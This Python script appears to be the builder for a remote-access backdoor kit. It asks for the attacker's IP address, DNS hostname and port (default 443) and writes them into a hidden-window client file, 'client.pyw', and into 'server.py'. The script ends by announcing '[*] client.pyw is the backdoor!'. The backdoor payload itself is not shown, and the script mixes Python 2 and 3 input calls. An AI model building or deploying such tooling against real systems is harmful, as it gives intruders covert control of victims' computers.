import os, sys, socket

# get the path to python install dir

try:
    # create a dummy socket to get local IP address
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    objSocket.connect(("google.com", 0))
    strCurrentIP = objSocket.getsockname()[0]
    objSocket.close()
except socket.error:
    print("[!][Error]: Make sure you are connected to the internet.")
    sys.exit(0)

if not os.path.isfile("client.pyw"):
    print("[!][Error]: client.pyw not found!")
    sys.exit(0)


print("1. Use: " + strCurrentIP)
print("2. Use a different IP address for server")
print("3. Use a DNS Hostname")

strChoice = input("\n" + "Type selection: ")
strDNSHostname = None

if strChoice == "1":
    pass
elif strChoice == "2":
    strCurrentIP = input("\n" + "Enter IP: ")
elif strChoice == "3":
    strDNSHostname = input("\n" + "Enter DNS Hostname: ")
#else:
#    print("[!][Error]: Invalid Choice!")
#    sys.exit(0)

strPort = raw_input("Enter port number (Press ENTER for default): ")

if strPort == "":
    strPort = "443"
else:
    # check to make sure port is a number between 0 and 65535
    if not 0 <= int(strPort) <= 65535:
        print("[!][Error]: You must enter a port between 0 and 65535!")
        sys.exit(0)

    # check to make sure server exists
    elif not os.path.isfile("server.py"):
        print("[!][Error]: server.py not found!")
        sys.exit(0)

    # open server and put all lines in an array
    objServerFile = open("server.py", "r")
    arrFileContents = objServerFile.readlines()
    objServerFile.close()

    # use loop in order to ensure that line number doesnt matter
    for intCounter in range(0, len(arrFileContents)):
        # if the current line is the line that sets the port, set the port
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + str(strPort) + "\n"
            break

    # write lines to server
    objServerFile = open("server.py", "w")
    objServerFile.writelines(arrFileContents)
    objServerFile.close()


objClientFile = open("client.pyw", "r")
arrFileContents = objClientFile.readlines()
objClientFile.close()

# if the user is not using dns
if strChoice == "2" or strChoice == "1":
    for intCounter in range(0, len(arrFileContents)):
        # check for the first occurrence of the host
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            # set strHost to be the IP
            arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
            # comment out the line below used for DNS
            arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
            # break for the first occurrence
            break
else:
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
            arrFileContents[intCounter] = "# strHost = \"\"" + "\n"
            arrFileContents[intCounter + 1] = "strHost = socket.gethostbyname(\"" + str(strDNSHostname) + "\")" + "\n"
            break

if strPort != "":
    # if the user entered a custom port, change it in the client
    for intCounter in range(0, len(arrFileContents)):
        if arrFileContents[intCounter][0:9] == "intPort =":
            arrFileContents[intCounter] = "intPort = " + str(strPort) + "\n"
            break

objClientFile = open("client.pyw", "w")
objClientFile.writelines(arrFileContents)
objClientFile.close()
print("[*] client.pyw is the backdoor!")